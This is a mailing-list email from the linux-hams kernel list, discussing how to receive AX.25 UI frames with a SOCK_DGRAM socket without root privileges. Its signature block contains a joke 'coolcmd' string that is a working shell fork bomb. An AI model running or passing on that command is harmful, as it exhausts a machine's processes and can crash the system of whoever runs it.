Return-Path: <linux-hams-owner@vger.kernel.org>
X-Original-To: lists+linux-hams@lfdr.de
Delivered-To: lists+linux-hams@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 80037415275
	for <lists+linux-hams@lfdr.de>; Wed, 22 Sep 2021 23:11:14 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S237965AbhIVVMn (ORCPT <rfc822;lists+linux-hams@lfdr.de>);
        Wed, 22 Sep 2021 17:12:43 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:37906 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S237930AbhIVVMn (ORCPT
        <rfc822;linux-hams@vger.kernel.org>); Wed, 22 Sep 2021 17:12:43 -0400
Received: from mail-oi1-x232.google.com (mail-oi1-x232.google.com [IPv6:2607:f8b0:4864:20::232])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D71CAC061574
        for <linux-hams@vger.kernel.org>; Wed, 22 Sep 2021 14:11:12 -0700 (PDT)
Received: by mail-oi1-x232.google.com with SMTP id s69so6445807oie.13
        for <linux-hams@vger.kernel.org>; Wed, 22 Sep 2021 14:11:12 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=habets.se; s=google;
        h=in-reply-to:mime-version:references:from:date:message-id:subject:to
         :cc;
        bh=SsofWZwCaC6r+93dh4qQw8aqw3D2XxfRV4HuPhaVWaw=;
        b=FhEuvwgDn94H3OWuH5fgzhgXMzEOdWpmBthqyjXJRszI+zLfRXjUx4FDFkOxr/Ra/l
         73QvrzOW1h119gFyBK7WqprCJ9qSyIWe8NNNBcxhHYPPDPybibpaH7DwdCVgv9/74na5
         0lLncXiiq0byTVThnTvxvcdZRMwyf/+0OLW0M=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:in-reply-to:mime-version:references:from:date
         :message-id:subject:to:cc;
        bh=SsofWZwCaC6r+93dh4qQw8aqw3D2XxfRV4HuPhaVWaw=;
        b=JQE4bpwDwLDdICrTWK4FnDHdBngtMqSvDgFNXn31ZHgIoFnCvTs+WS7oclG9NDpjbV
         OoiqGU1WKnK+2WU/OHUEhxaMaxExa/M+Z2s6SqW01DWNVbtMiUePSOeul+JbPaIdqk/C
         DyAm7WEnRSl+ZFVGaiIJOzgeoa3YIwp4GxjJehCx6dH7+2UGZEM/WRnnWifCR4hKae/w
         weNMuYcqhMw1Ew9W3BsDR0ynUJT0v5TWfGoJfijex0c/+ZR7RGo8g7WnRfEg0bR+YIX+
         KrqU92ZvP3zh64EgbWPv1axUd8BUjr8r3J8PaUWMEBCU2idWUCH0EVQ+d9oHw8G7e2Fj
         PsVQ==
X-Gm-Message-State: AOAM532DF0gGKfHZZ56ZEiGpeNvlKtg7/xjaaU3L3+KF9uX7BV3LpQ8Z
        WNcrDwK+A/APQ4eZUfnXyEytkzt5NLpQaR2zLC8Sb4xyLmrLow==
X-Google-Smtp-Source: ABdhPJxz7Gl28E2gQxDFEiKMIua9Y4cWaNSu5+XyaQjhn/Q/wPIqEhLXUw7rVAfWQjOyd3T2aDx5tyQMdZLY4OvWquY=
X-Received: by 2002:a54:418a:: with SMTP id 10mr1010818oiy.13.1632345072166;
 Wed, 22 Sep 2021 14:11:12 -0700 (PDT)
Received: from 195210475306 named unknown by gmailapi.google.com with
 HTTPREST; Wed, 22 Sep 2021 14:11:11 -0700
In-Reply-To: <e235ee10-5774-f690-0c5e-5dc575482936@trinnet.net>
MIME-Version: 1.0
References: <CA+kHd+e=XQ6m7YgMGMmK5FjkX=bYVEQ7n57GaY8j0qHtwzZPpg@mail.gmail.com>
 <e235ee10-5774-f690-0c5e-5dc575482936@trinnet.net>
From:   thomas@habets.se
Date:   Wed, 22 Sep 2021 14:11:11 -0700
Message-ID: <CA+kHd+cvbwz+T2rwnGG7JpcK33DAn25kk4FWUckVT3P9nY+2=A@mail.gmail.com>
Subject: Re: Unable to receive UI frames with DGRAM socket
To:     David Ranch <linux-hams@trinnet.net>
Cc:     linux-hams@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Precedence: bulk
List-ID: <linux-hams.vger.kernel.org>
X-Mailing-List: linux-hams@vger.kernel.org

On Wed, 22 Sep 2021 16:32:41 +0100, David Ranch <linux-hams@trinnet.net> said:
> I recommend to look at how ax25-apps's "listen" program works to get
> some ideas.  It DOESN'T bind to the stack in the way you're proposing
> and instead uses the SOCK_PACKET approach.

Yeah, I tried to draw inspiration from others. But I'm failing to find
anything that doesn't require root.

E.g. axlisten from ax25-apps does:
  socket(AF_PACKET, SOCK_PACKET, htons(ETH_P_AX25))
axlisten -a does:
  socket(AF_PACKET, SOCK_PACKET, htons(ETH_P_ALL))

Both require root (or NET_ADMIN, or whatever capability).

But surely there should be a way to use SOCK_DGRAM, in any capacity at
all?
The code explicitly handles it here:
https://elixir.bootlin.com/linux/latest/source/net/ax25/ax25_in.c#L260

While working on this I've actually already been doing experiments
with SOCK_PACKET, and yes sure aside from needing root and requiring
parsing the AX.25 header myself, it does work.

But those are two major drawbacks.

--
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.se" };
  char kernel[]    = { "Linux" };
  char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
  char pgp[] = { "9907 8698 8A24 F52F 1C2E  87F6 39A4 9EEA 460A 0169" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;
